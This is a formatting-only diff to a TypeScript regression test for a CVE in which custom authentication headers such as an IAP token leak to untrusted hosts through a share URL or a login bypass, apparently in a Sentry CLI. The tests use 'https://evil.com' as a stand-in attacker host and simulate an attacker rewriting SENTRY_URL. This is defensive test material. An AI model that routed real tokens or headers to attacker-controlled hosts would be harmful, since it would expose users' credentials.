@@ -56,10 +56,10 @@ describe("CVE: custom-headers leak (share URL + auth-login bypass)", () => {
     let capturedHeaders: Headers | undefined;
     globalThis.fetch = (async (
       input: RequestInfo | URL,
-      init?: RequestInit
+      init?: RequestInit,
     ) => {
       capturedHeaders = new Headers(
-        init?.headers ?? (input instanceof Request ? input.headers : undefined)
+        init?.headers ?? (input instanceof Request ? input.headers : undefined),
       );
       return new Response("{}", { status: 404 });
     }) as typeof fetch;
@@ -68,7 +68,7 @@ describe("CVE: custom-headers leak (share URL + auth-login bypass)", () => {
       await getSharedIssue(
         "https://evil.com",
         "test-org",
-        "deadbeef12345678"
+        "deadbeef12345678",
       ).catch(() => {
         /* we only care about headers, not the response */
       });
@@ -88,9 +88,8 @@ describe("CVE: custom-headers leak (share URL + auth-login bypass)", () => {
     process.env.SENTRY_CUSTOM_HEADERS = "X-IAP-Token: legit";
 
     // `applyLoginUrl` (from login command) registers the trust anchor
-    const { applyLoginUrl } = await import(
-      "../../../src/commands/auth/login.js"
-    );
+    const { applyLoginUrl } =
+      await import("../../../src/commands/auth/login.js");
     applyLoginUrl("https://sentry.acme.com");
 
     const headers = new Headers();
@@ -99,9 +98,8 @@ describe("CVE: custom-headers leak (share URL + auth-login bypass)", () => {
     expect(headers.get("X-IAP-Token")).toBe("legit");
 
     // Cleanup the anchor so subsequent tests aren't affected
-    const { resetLoginTrustAnchorForTesting } = await import(
-      "../../../src/lib/token-host.js"
-    );
+    const { resetLoginTrustAnchorForTesting } =
+      await import("../../../src/lib/token-host.js");
     resetLoginTrustAnchorForTesting();
   });
 
@@ -117,9 +115,8 @@ describe("CVE: custom-headers leak (share URL + auth-login bypass)", () => {
     process.env.SENTRY_URL = "https://evil.com"; // simulating rc shim write
     // Intentionally NOT calling applyLoginUrl — attacker flow doesn't
 
-    const { resetLoginTrustAnchorForTesting } = await import(
-      "../../../src/lib/token-host.js"
-    );
+    const { resetLoginTrustAnchorForTesting } =
+      await import("../../../src/lib/token-host.js");
     resetLoginTrustAnchorForTesting();
 
     const headers = new Headers();
